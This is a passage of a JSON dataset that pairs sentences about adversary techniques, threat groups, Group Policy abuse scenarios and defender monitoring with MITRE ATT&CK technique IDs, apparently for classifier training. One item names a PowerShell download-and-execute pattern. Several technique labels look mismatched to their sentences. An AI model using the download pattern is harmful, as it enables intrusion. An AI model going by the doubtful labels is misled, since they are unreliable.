    "text": "TeamTNT has the curl command to send credentials over HTTP and download new software.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "TeamTNT has also used a custom user agent HTTP header in shell scripts.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for web traffic to/from known-bad or suspicious domains and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may transfer tools or other files from an external system into a compromised environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment ( Lateral Tool Transfer).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On Windows, adversaries may use various utilities to download tools, such as copy, finger, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT has a command to download files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OSX/Shlayer can download payloads, and extract bytes from files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for file creation and files transferred into the network",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed network connections that are sent or received by untrusted hosts or creating files on-system may be suspicious.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Use of utilities, such as FTP, that does not normally occur may also be suspicious.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Monitor network traffic content for files and other potentially malicious content, especially data coming in from abnormal/unknown domain and IPs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Monitor network data for uncommon data flows (, a client sending significantly more data than it receives from a server).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Attacker modifies the default domain Group Policy to deploy a startup script that changes local security settings across the domain.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actor edits a Group Policy preference to push a modified scheduled task to multiple hosts via the domain controller.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Malicious change: change group membership via a GPO preference to add a domain account to local administrators on all endpoints.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The attacker configures a new Group Policy preference to map a network drive for all users in an OU, pointing to a malicious share.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An operator uses a script deployed through Group Policy to disable security auditing on many hosts simultaneously.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "A compromised admin account updates domain policy to deploy a malicious login script to all workstation startup sequences.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversary leverages GPO to modify scheduled patch tasks so that malicious payload executes during off-hours.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "An operator applies a GPO that changes user rights assignments to grant service start privileges to an unprivileged domain account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Malicious administrator creates a GPO to distribute a scheduled task that runs a binary from a network share on logon.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Threat actor alters a Group Policy object to push a new software installation (signed or unsigned) to endpoints in a target OU.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An attacker modifies Group Policy to alter audit policy settings, reducing logging detail that would reveal their actions.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Adversary updates a GPO to change PowerShell execution policies domain-wide to allow unsigned scripts to run.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware.",
    "command": "",
    "labels": [
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "However, the system may require an administrative account to log in or to access specific functionality.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Carberp has created a hidden file in the Startup folder of the current user.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "COATHANGER creates and installs itself to a hidden installation directory.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Cuckoo Stealer has copied its binary and the victim's scraped password into a hidden folder in the /Users directory.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FIN13 has created hidden files and folders within a compromised Linux system /tmp directory. FIN13 also has used attrib.exe to hide gathered local host information.",
    "command": "",
    "labels": [
      "T1005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Micropsia creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda's PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Before exfiltration, Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda stored encrypted payloads associated with PlugX installation in hidden directories during RedDelta Modified PlugX Infection Chain Operations.",
    "command": "",
    "labels": [
      "T1005"
    ]
  }
]